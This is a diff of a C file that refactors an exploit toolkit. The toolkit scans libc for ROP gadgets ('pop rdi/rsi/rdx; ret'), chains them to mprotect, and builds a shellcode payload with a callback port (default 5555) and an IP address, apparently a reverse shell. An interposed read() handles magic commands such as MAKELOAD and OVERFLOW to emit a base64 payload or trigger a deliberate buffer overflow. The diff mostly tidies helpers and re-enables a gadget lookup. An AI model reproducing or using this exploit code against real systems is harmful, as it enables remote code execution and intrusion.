@@ -6,86 +6,10 @@
 #include <stddef.h>
 #include <stdio.h>
 #include <string.h>
-#include <string.h>
 #include <unistd.h>
 
-static const unsigned char tEncode64[64] = {
-	'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
-	'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
-	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
-	'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'
-};
-
-static size_t encode64(const unsigned char *s256, const size_t n256, unsigned char *s64, size_t m64) {
-
-	// Calculate encoded size but limit to size of our output buffer
-	size_t n64 = 4 * ((n256 + 2) / 3);
-	if (n64 > m64)
-		n64 = m64;
-
-	// Loop over input data generating four 6-in-8 bytes for each three 8-in-8 bytes
-	for (size_t i256 = 0, i64 = 0, triple = 0; i256 < n256 && i64 < n64;) {
-		for (size_t i = 0; i < 3; i++)
-			triple = (triple << 8) + ((i256 < n256 ) ? s256[i256++] : 0);
-
-		for (size_t i = 0; i < 4; i++)
-			s64[i64++] = tEncode64[(triple >> ((3 - i) * 6)) & (1 << 6) - 1];
-	} // for
-
-	// Back-patch trailing overrun created by the "chunky" encoder (above).
-	for (size_t i = 0; i < (n256 * 2) % 3; i++)
-		s64[n64 - 1 - i] = '=';
-
-	return n64;
-} // encode64()
-
-static const unsigned char tDecode64[256] = {
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
-	52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
-	64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
-	15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
-	64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
-	41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
-	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
-};
-
-static size_t length64(const unsigned char *s64) {
-	for (size_t i = 0; ; i++)
-		if (tDecode64[s64[i]] >  63)
-			return i;
-} // length64()
-
-static size_t decode64(const unsigned char *s64, const size_t n64, unsigned char *s256, const size_t m256) {
-
-	// Calculate decoded size but limit to size of our output buffer
-	size_t n256 = (((n64 + 3) / 4) * 3) - ((4 - n64) & 3);
-
-	// Don't write more than m256 bytes
-	if (n256 > m256)
-		n256 = m256;
-
-	// Loop over input data generating three 8-in-8 bytes for each four 6-in-8 bytes
-	for (size_t i64 = 0, i256 = 0; i64 < n64 && i256 < n256; i64++) {
-		if (i64 < n64 - 1) { s256[i256++] = (tDecode64[s64[i64]] << 2 | tDecode64[s64[i64 + 1]] >> 4); i64++; }
-		if (i64 < n64 - 1) { s256[i256++] = (tDecode64[s64[i64]] << 4 | tDecode64[s64[i64 + 1]] >> 2); i64++; }
-		if (i64 < n64 - 1) { s256[i256++] = (tDecode64[s64[i64]] << 6 | tDecode64[s64[i64 + 1]] >> 0); i64++; }
-	} // for
-
-	// Append a NUL if there is room to do so (but don't count it as a decoded character)
-	if (n256 < m256)
-		s256[n256] = '\0';
-
-	return n256;
-} // decode64()
+#include "base64.h"
+#include "strnstr.h"
 
 typedef void *Pointer;
 
@@ -101,12 +25,10 @@ typedef union AddressUnion {
 	char	c[8];
 } AddressUnion, *AddressUnionPtr;
 
-typedef struct in_addr IPAddress, *IPAddressPtr;
-
 typedef struct ShellCode {
 	unsigned char	prolog[18];
 	unsigned short	port;
-	IPAddress	ipAddress;
+	struct in_addr	ipAddress;
 	unsigned char	epilog[50];
 	unsigned short	unused;
 } ShellCode, *ShellCodePtr;
@@ -133,14 +55,13 @@ typedef struct Payload {
 
 static const char s_elf_signature[] = {0x7F, 'E', 'L', 'F', 0};
 
-static const char *s_magic = "xyzzy";
+static const char s_magic[]	= "xyzzy";
 
-static const char *s_makeload = "MAKELOAD";
-static const char *s_dumpload = "DUMPLOAD";
-static const char *s_testload = "TESTLOAD";
-static const char *s_overflow = "OVERFLOW";
+static const char s_makeload[]	= "MAKELOAD";
+static const char s_dumpload[]	= "DUMPLOAD";
+static const char s_testload[]	= "TESTLOAD";
+static const char s_overflow[]	= "OVERFLOW";
 
-static const char s_libc_base[]     = "base";
 static const char s_libc_popRDI[]   = {0x5f, 0xc3, 0};
 static const char s_libc_popRSI[]   = {0x5e, 0xc3, 0};
 static const char s_libc_popRDX[]   = {0x5a, 0xc3, 0};
@@ -195,11 +116,13 @@ _Bool initialized = 0;
 
 ssize_t (*libc_read)(int fd, void *buf, size_t count)	= NULL;
 Pointer libc_mprotect					= NULL;
-Pointer libc_base					= NULL;
-size_t  libc_size					= 0;
 Pointer libc_popRDI					= NULL;
 Pointer libc_popRSI					= NULL;
 Pointer libc_popRDX					= NULL;
+
+size_t  libc_size					= 0;
+
+Pointer libc_base					= NULL;
 Pointer pie_base					= NULL;
 Pointer stack_base					= NULL;
 Pointer buffer_base					= NULL;
@@ -222,25 +145,8 @@ static Pointer stackPage(void) {
 	return pageBase(&dummy);
 } // stackPage()
 
-static char *strnstr(const char *s1, const char *s2, size_t len)
-{
-	size_t l2 = strlen(s2);
-
-	if (!l2)
-		return (char *)s1;
-
-	while (len >= l2) {
-		len--;
-		if (!memcmp(s1, s2, l2))
-			return (char *)s1;
-		s1++;
-	} // while
-
-	return NULL;
-} // strnstr()
-
 static Pointer findGadget(const Pointer start, const char *gadget, const size_t size) {
-     return strnstr(libc_base, gadget, size);
+	return strnstr(libc_base, gadget, size);
 } // findGadget()
 
 static void initialize(void)
@@ -252,7 +158,7 @@ static void initialize(void)
 		libc_base	= elfBase(libc_mprotect);
 
 		libc_popRDI	= findGadget(libc_base, s_libc_popRDI, libc_size);
-		libc_popRSI	= // NULL; //findGadget(libc_base, s_libc_popRSI, libc_size);
+		libc_popRSI	= findGadget(libc_base, s_libc_popRSI, libc_size);
 		libc_popRDX	= findGadget(libc_base, s_libc_popRDX, libc_size);
 
 		pie_base	= elfBase(initialize);
@@ -302,21 +208,6 @@ static AddressUnion fixupAddressUnion(AddressUnion au) {
 	return au;
 } // fixupAddressUnion()
 
-static int lookupHostName(char *hostName, char *ip)
-{
-    struct hostent *he = gethostbyname(hostName);;
-    if (he == NULL)
-		return 1;
- 
-    struct in_addr **addr_list = (struct in_addr **) he->h_addr_list;
-    for (int i = 0; addr_list[i] != NULL; i++) {
-		strcpy(ip, inet_ntoa(*addr_list[i]));
-		return 0;
-    } // for
-     
-    return 1;
-} // lookupHostName()
-
 static void makeload(PayloadPtr plp) {
 	ptrdiff_t libc_mprotect_offset = libc_mprotect - libc_base;
 
@@ -344,23 +235,20 @@ static void makeload(PayloadPtr plp) {
 	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
 	int volatile v = 0;
 
-	// Gadget for "POP RDI"
 	if (v) {
-l_popRDI:
+l_popRDI:	// Fallback gadget for "POP RDI"
 		__asm__ ("pop %rdi");
 		__asm__ ("ret");
 	} // if
 
-	// Gadget for "POP RSI"
 	if (v) {
-l_popRSI:
+l_popRSI:	// Fallback gadget for "POP RSI"
 		__asm__ ("pop %rsi");
 		__asm__ ("ret");
 	} // if
 
-	// Gadget for "POP RDX"
 	if (v) {
-l_popRDX:
+l_popRDX:	 // Fallback gadget for "POP RDX"
 		__asm__ ("pop %rdx");
 		__asm__ ("ret");
 	} // if
@@ -422,22 +310,16 @@ ssize_t read(int fd, void *buf, size_t count) {
 			// Set the port to whatever we got from the sscanf (store it in host endian order)
 			payload.pl_scu.sc.port = htons((ns > 1) ? port : 5555);
 
-			// First we'll see if the s_host string can be parsed by inet_aton()
+			// See if the s_host string can be parsed by inet_aton()
 			if (inet_aton(s_host, &payload.pl_scu.sc.ipAddress) == 0) {
-				struct hostent *he;
-
-				// Next we'll see if s_host can be resolved by DNS
-				if ((he = gethostbyname(s_host))) {
-					struct in_addr **addressList = (struct in_addr **) he->h_addr_list;
-
-					for (int i = 0; addressList[i] != NULL; i++)
- 						payload.pl_scu.sc.ipAddress = *addressList[i];
-				} // if
+				for (struct hostent *he = gethostbyname(s_host); he; he = NULL)
+					for (int i = 0; ((struct in_addr **) he->h_addr_list)[i] != NULL; i++)
+ 						payload.pl_scu.sc.ipAddress = *((struct in_addr **) he->h_addr_list)[i];
 			} // if
 
 			// Generate the payload that we will "echo" back
 			unsigned char sPayload64[4096];
-			size_t nPayload64 = encode64((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));
+			size_t nPayload64 = b64Encode((const unsigned char *) &payload, sizeof(payload), sPayload64, sizeof(sPayload64));
 
 			// Make room for the payload (where the request used to be).
 			char *src = p + nc;
@@ -464,7 +346,7 @@ ssize_t read(int fd, void *buf, size_t count) {
 			overflow((Pointer)&payload, sizeof(payload));
 		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
 			unsigned char *s64 = (unsigned char *) (p + strlen(s_overflow));
-			size_t n256 = decode64(s64, length64(s64), (unsigned char *) p, 65535);
+			size_t n256 = b64Decode(s64, b64Length(s64), (unsigned char *) p, 65535);
 			overflow(p, n256);
 		} // else if
 	} // if
@@ -485,7 +367,7 @@ int main(int argc, char **argv)
 	assert(sizeof(ptrdiff_t) == 8);
 	assert(sizeof(Offset) == 8);
 	assert(sizeof(AddressUnion) == 8);
-	assert(sizeof(IPAddress) == 4);
+	assert(sizeof(struct in_addr) == 4);
 	assert(sizeof(ShellCodeUnion) == 76);
 	assert(getpagesize() == 4096);
 	assert((-1^(getpagesize()-1))==0xfffffffffffff000);
